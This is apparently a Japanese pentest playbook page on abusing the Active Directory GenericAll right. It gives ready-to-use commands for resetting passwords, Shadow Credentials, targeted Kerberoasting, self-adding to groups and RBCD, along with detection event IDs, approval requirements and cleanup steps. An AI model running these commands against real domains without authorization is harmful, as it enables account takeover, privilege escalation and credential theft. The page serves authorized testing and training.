# GenericAll の悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で商用案件では原則禁止または個別合意必須：
> - [x] 業務停止リスク（実ユーザーのパスワードリセットは業務停止に直結）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（パスワードリセット・グループメンバー追加・SPN付与）
> - [x] SIEM/EDR で確実に検知される（Event ID 4724 パスワードリセット / 4728・4732 グループメンバー追加 / 4738 ユーザー属性変更）
>
> 実施可否は事前合意で明示確認すること。原状回復（パスワード復元・グループ削除）必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

`GenericAll` は対象オブジェクトへの完全制御権限。ユーザーオブジェクト・グループオブジェクト・コンピューターオブジェクトのいずれに対しても強力な攻撃ベクターになる。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --GenericAll--> [ターゲットオブジェクト]` が確認できた場合。

---

## 対象オブジェクト別の悪用手法

### ケース1: ユーザーオブジェクトへの GenericAll

**手法A: パスワードのリセット**
```bash
net rpc password [TARGET_USER] '[NEW_PASSWORD]' -U '[DOMAIN]/[CURRENT_USER]%[PASSWORD]' -S [DC_IP]
```

**手法B: Shadow Credentials（証明書ベースの認証）**
```bash
certipy shadow auto -u '[USER]@[DOMAIN]' -p '[PASSWORD]' -account '[TARGET_USER]' -dc-ip [DC_IP]
```

**手法C: Targeted Kerberoasting（SPN を付与してハッシュ取得）**
```bash
# GenericAll は GenericWrite を包含するため、SPN の設定が可能
python3 targetedKerberoast.py -v -d '[DOMAIN]' -u '[USER]' -p '[PASSWORD]' --dc-ip [DC_IP]
```

### ケース2: グループオブジェクトへの GenericAll

**自分自身をグループに追加する：**
```bash
# Linux 側から
net rpc group addmem '[GROUP_NAME]' '[CURRENT_USER]' \
  -U '[DOMAIN]/[CURRENT_USER]%[PASSWORD]' -S [DC_IP]

# PowerShell（Windows シェル内から）
Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
```

### ケース3: コンピューターオブジェクトへの GenericAll

**RBCD（Resource-Based Constrained Delegation）攻撃を実施：**

→ 詳細: `../Delegation_Attacks/RBCD.md`

対象コンピューターの `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性を変更して RBCD を設定できる。

---

## 確認手順（BloodHound で権限を特定してから）

```bash
# 現在のユーザーの ACE を確認
bloodhound-python -u [USER] -p '[PASSWORD]' -d [DOMAIN] -ns [DC_IP] -c ACL
```

BloodHound GUI で対象ノードを選択 → 「Inbound Object Control」→ `GenericAll` を確認。

---

## 注意点・落とし穴

- GenericAll を持っているのが「ユーザー自身」なのか「所属グループ経由」なのかを確認する（BloodHound は両方表示する）
- パスワードリセット後は元のパスワードに戻すか、ターゲットのパスワード変更が検知される可能性を考慮する
- Shadow Credentials は ADCS（Active Directory Certificate Services）環境が必要な場合がある

---

### 商用案件での前提

- **事前合意の要否**: ★★★（書面承認必須）。実ユーザーのパスワードリセットは業務停止に直結するため、対象ユーザーごとに個別承認が必要
- **想定されるSIEM/EDR検知**:
  - Event ID 4724（管理者によるパスワードリセット）
  - Event ID 4728 / 4732（セキュリティが有効なグローバル/ローカルグループへのメンバー追加）
  - Event ID 4738（ユーザーアカウント属性変更：SPN 追加等）
  - Event ID 4769（Targeted Kerberoasting で SPN 追加後に発生する TGS 要求）
- **業務影響リスク**: サービス停止（パスワードリセット対象ユーザーは即座に業務不可になる）／グループ権限変更による業務上の権限拡張
- **原状回復必須項目**:
  - ✅ パスワードリセットしたユーザー：可能な限り元のパスワードへ戻す（不可なら顧客側でリセット運用）
  - ✅ 追加したグループメンバーシップの削除（`net rpc group delmem` / `Remove-ADGroupMember`）
  - ✅ Targeted Kerberoasting で付与した SPN の削除
  - ✅ Shadow Credentials で追加した `msDS-KeyCredentialLink` 値の削除（`certipy shadow remove`）
  - ✅ 取得した TGT / NTLM ハッシュは暗号化保管 → 案件終了時破棄
- **取得情報の取扱**: 取得した認証情報・TGT・ハッシュは暗号化保管、案件終了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術
- RBCD 攻撃 → `../Delegation_Attacks/RBCD.md`
- Kerberoasting → `../Kerberos_Attacks/Kerberoasting.md`
- GenericWrite との違い → `GenericWrite.md`（SPN 設定・logon script のみ）
